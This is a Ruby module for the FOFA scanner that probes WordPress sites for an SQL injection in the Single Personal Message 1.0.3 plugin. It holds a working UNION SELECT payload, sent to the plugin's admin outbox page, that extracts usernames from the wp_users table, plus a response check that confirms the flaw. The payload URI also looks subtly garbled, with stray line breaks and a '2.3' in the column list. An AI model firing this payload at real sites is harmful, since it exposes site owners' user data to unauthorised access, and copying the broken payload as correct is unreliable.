require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def get_info
    {
      "Name": "Wordpress 插件 Single Personal Message 1.0.3 SQL注入",
      "Description": "$ _GET ['message']变量没有被转义。 每个注册用户都可以访问它。",
      "Author": "bibotaixsf@msn.cn",
      "Product": "Wordpress",
      "Homepage": "http://www.wordpress.com/",
      "DisclosureDate": "2016-11-28",
      "FofaQuery":"( body=\"content=\\\"WordPress\"$$ || (header=\"X-Pingback\" && header=\"/xmlrpc.php\" && body=\"/wp-includes/\" ) )",
      "References":["https://www.exploit-db.com/exploits/40870/"      ],
      "ScanSteps":[
        "AND",
        {
          "Request":
          {
            "method": "GET",
            "uri": "/wordpress/wp-admin/admin.php?page=simple-personal-message-\noutbox&action=view&message=0%20UNION%20SELECT%\n201,2.3,user_login,5,md5(12345),7,8,9,10,11,12%20FROM%20wp_users%20WHERE%20ID=1",
          },
          "ResponseTest":
          {
            "type": "group",
            "operation": "AND",
            "checks": [
              {
                "type": "item",
                "variable": "$body",
                "operation": "contains",
                "value": "827ccb0eea8a706c4c34a16891f84e7b"
              }
            ]
          },
          "SetVariable": ["var_1|lastbody|regex|"]
        }
      ]
    }
  end





  def initialize(info = {})
    super( info.merge(get_info()) )
  end

  def vulnerable(hostinfo)
    excute_scansteps(hostinfo) if @info['ScanSteps']
  end

  def exploit(hostinfo)
  end
end
